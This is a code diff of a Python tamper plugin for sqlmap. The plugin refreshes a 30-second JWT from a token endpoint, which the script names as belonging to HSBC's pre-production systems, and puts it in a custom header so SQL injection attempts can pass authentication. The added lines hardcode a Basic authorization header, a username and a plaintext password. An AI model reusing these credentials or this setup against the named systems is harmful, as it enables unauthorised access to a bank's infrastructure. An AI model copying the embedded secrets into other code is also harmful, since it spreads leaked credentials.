@@ -1,44 +1,44 @@
 #!/usr/bin/env python3
-# encoding: utf-8
+# -*- coding: utf-8 -*-
 #
-# Tamper script for SQLmap: automatically refreshes the short‑lived JWT
-# and injects it into the X‑HSBC‑E2E‑Trust‑Token header on every request.
-#
-# Place this file into your tamper directory and invoke with:
-#   sqlmap … --tamper=auth_token_refresh.pyd
+# SQLmap tamper: refresh 30s JWT before each request,
+# using SQLmap’s own Request API (no urllib).
 
 import time
 import json
-import base64
 
+# tamper priority
 try:
-    # SQLmap’s internal enum for tamper priority
     from lib.core.enums import PRIORITY
     __priority__ = PRIORITY.NORMAL
 except ImportError:
-    # fallback if running outside of SQLmap install
     __priority__ = 0
 
-# ─── CONFIGURATION ──────────────────────────────────────────────────────────────
-# Update these to match your environment:
-TOKEN_URL = "https://cmb-i b2b-dsp-pprod-eu.systems.uk.hsbc:8443" \
-            "/dsp/rest-sts/DSP_iB2B/iB2B_tokenTranslator?_action=translate"
-USERNAME  = ""
-PASSWORD  = ""
+# ─── CONFIG ─────────────────────────────────────────────────────────────────────
+# Your translate endpoint (no stray spaces!)
+TOKEN_URL = (
+    "https://cmb-ib2b-dsp-pprod-eu.systems.uk.hsbc:8443"
+    "/dsp/rest-sts/DSP_iB2B/iB2B_tokenTranslator?_action=translate"
+)
+
+# Exactly the Basic header you saw working
+AUTH_HEADER = "Basic VEVPRESWOnJhNzQzNzgw"
+
+# JSON body creds
+USERNAME = "CMBOBKYC-PCBIS-MCT"
+PASSWORD = "gfA96qG48NyKLR"
 # ────────────────────────────────────────────────────────────────────────────────
 
-# Global cache for token and expiry time
-_cached_token  = None
-_expiry_unix   = 0.0
+_cached_token = None
+_next_refresh = 0.0
 
 def _fetch_new_token():
     """
-    POST to the DSP_iB2B tokenTranslator endpoint, parse out the issued_token,
-    and reset our expiry clock to ~25s from now (so we refresh before 30s expiry).
+    POST via SQLmap’s Request.getPage, parse the JSON, cache JWT,
+    schedule next refresh at now+25s (so we never send an expired 30s token).
     """
-    global _cached_token, _expiry_unix
+    global _cached_token, _next_refresh
 
-    # build the JSON body
     body = {
         "input_token_state": {
             "token_type": "CREDENTIAL",
@@ -49,47 +49,65 @@ def _fetch_new_token():
             "token_type": "JWT"
         }
     }
-    data = json.dumps(body).encode("utf-8")
+    data = json.dumps(body)
 
-    # perform the HTTPS request
-    import urllib.request
-    req = urllib.request.Request(
-        TOKEN_URL,
+    headers = {
+        "Content-Type":  "application/json",
+        "Accept":        "*/*",
+        "Authorization": AUTH_HEADER
+    }
+
+    # use SQLmap's HTTP engine
+    from lib.request import Request
+
+    # Request.getPage returns (body, headers, status)
+    page, resp_headers, status = Request.getPage(
+        url=TOKEN_URL,
+        httpMethod="POST",
         data=data,
-        headers = {
-            "Content-Type": "application/json"
-        }
+        headers=headers
     )
-    with urllib.request.urlopen(req, timeout=10) as resp:
-        resp_json = json.loads(resp.read().decode("utf-8"))
 
-    # extract token and set next-refresh threshold
-    _cached_token = resp_json.get("issued_token", "")
-    # refresh after 25s so we never send an expired token
-    _expiry_unix  = time.time() + 25
-    return _cached_token
+    if status != 200:
+        raise RuntimeError(f"[auth_token_refresh] token endpoint returned HTTP {status}")
+
+    js = json.loads(page)
+    token = js.get("issued_token")
+    if not token:
+        raise RuntimeError("[auth_token_refresh] no 'issued_token' in JSON response")
+
+    _cached_token = token
+    _next_refresh = time.time() + 25
+    print(f"[auth_token_refresh] fetched new token, next refresh at {_next_refresh:.0f}")
+    return token
 
 def dependencies():
     """
-    SQLmap calls this once at startup. Grab the first token here.
+    Called once at startup; prime the token cache.
     """
-    _fetch_new_token()
+    try:
+        _fetch_new_token()
+    except Exception as e:
+        # visible with -v 3
+        print(f"[auth_token_refresh] initial token fetch failed: {e!r}")
 
 def tamper(payload, **kwargs):
     """
-    Called for each injection attempt. We ignore the payload itself and
-    instead ensure our header is up-to-date.
+    Called before each HTTP request.  Refresh if needed, then overwrite header.
     """
-    global _cached_token, _expiry_unix
+    global _cached_token, _next_refresh
 
-    # refresh if we're past our refresh threshold
-    if not _cached_token or time.time() >= _expiry_unix:
-        _fetch_new_token()
+    # if no token or past refresh time, grab a new one
+    if not _cached_token or time.time() >= _next_refresh:
+        try:
+            _fetch_new_token()
+        except Exception as e:
+            print(f"[auth_token_refresh] token refresh error: {e!r}")
 
-    # kwargs['headers'] is the dict of outgoing headers
-    headers = kwargs.get("headers")
-    if isinstance(headers, dict):
-        headers["X-HSBC-E2E-Trust-Token"] = _cached_token
+    # inject into outgoing headers
+    hdrs = kwargs.get("headers")
+    if isinstance(hdrs, dict) and _cached_token:
+        hdrs["X-HSBC-E2E-Trust-Token"] = _cached_token
 
-    # return the payload unchanged
+    # leave the SQL injection payload unchanged
     return payload
